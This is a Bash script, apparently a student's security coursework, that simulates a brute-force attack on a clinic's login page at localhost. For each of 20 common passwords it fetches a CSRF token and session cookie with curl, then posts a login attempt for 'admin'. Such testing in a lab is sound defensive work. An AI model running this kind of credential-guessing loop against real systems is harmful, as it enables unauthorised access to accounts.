#!/bin/bash
# ==============================================================================
# Script: scripts/simulate_bruteforce.sh
# Mô phỏng tấn công Brute Force vào trang đăng nhập phòng khám
# Sinh viên: Ma Thị Thanh Tú - DTC245200587
# ==============================================================================

set -euo pipefail

TARGET_URL="https://localhost/login"
COOKIES_FILE="/tmp/brute_cookies.txt"
LOGIN_PAGE="/tmp/brute_login.html"
TARGET_USER="admin"

echo "=============================================================================="
echo "BẮT ĐẦU MÔ PHỎNG TẤN CÔNG DÒ MẬT KHẨU (BRUTE FORCE ATTACK)"
echo "Target: $TARGET_URL | User: $TARGET_USER | Số lần thử: 20 lần"
echo "Thời gian bắt đầu: $(date)"
echo "=============================================================================="
echo ""

# Danh sách 20 mật khẩu sai điển hình
PASSWORDS=(
  "123456" "password" "admin123" "admin@123" "12345678"
  "root" "qwerty" "pass1234" "welcome" "hospital123"
  "clinic2026" "clinic@123" "Admin@2026" "Secret#123" "pass@123"
  "master123" "superuser" "access2026" "doctor@123" "invalid_pass_20"
)

for i in "${!PASSWORDS[@]}"; do
  ATTEMPT=$((i + 1))
  WRONG_PW="${PASSWORDS[$i]}"

  # Bước 1: Lấy CSRF token và cookie phiên
  rm -f "$COOKIES_FILE" "$LOGIN_PAGE"
  curl -k -s -c "$COOKIES_FILE" "$TARGET_URL" -o "$LOGIN_PAGE"
  CSRF=$(grep 'name="csrf_token"' "$LOGIN_PAGE" | head -n 1 | sed -E 's/.*value="([^"]+)".*/\1/' || echo "")

  # Bước 2: Gửi POST đăng nhập sai
  RESP=$(curl -k -s -b "$COOKIES_FILE" -c "$COOKIES_FILE" \
    -d "username=$TARGET_USER&password=$WRONG_PW&csrf_token=$CSRF" \
    -w "HTTP_CODE:%{http_code} TIME:%{time_total}s" \
    -o /dev/null \
    "$TARGET_URL")

  echo "[Lần $ATTEMPT/20] $(date +'%T') | User: $TARGET_USER | Pass: '$WRONG_PW' | Phản hồi: $RESP"
  sleep 0.5
done

echo ""
echo "=============================================================================="
echo "[✓] Hoàn thành 20 lần thử đăng nhập sai liên tiếp lúc $(date)"
echo "=============================================================================="
